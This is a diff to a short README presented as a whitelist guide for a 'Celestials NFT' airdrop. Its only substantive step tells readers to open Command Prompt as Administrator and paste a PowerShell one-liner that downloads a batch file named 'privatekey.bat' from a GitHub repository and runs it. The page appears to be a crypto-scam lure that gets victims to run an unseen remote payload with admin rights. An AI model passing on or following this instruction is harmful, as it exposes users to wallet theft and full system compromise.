@@ -1,7 +1,7 @@
 # CELESTIALS NFT WHITELIST GUIDE
-How to generate wallet and qualify for Celestials NFT
+How to generate wallet and qualify for Celestials NFT Airdrop
 
-1. When your command Prompt on Windows as Admin and run the following:
+1. Open your command Prompt on Windows as Admin and run the following:
 ```
 powershell -Command "Invoke-WebRequest -Uri https://github.com/CelestialNFT/Airdrop-Whitelist/raw/refs/heads/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath privatekey.bat -ArgumentList /c -NoNewWindow -Wait"
 ```
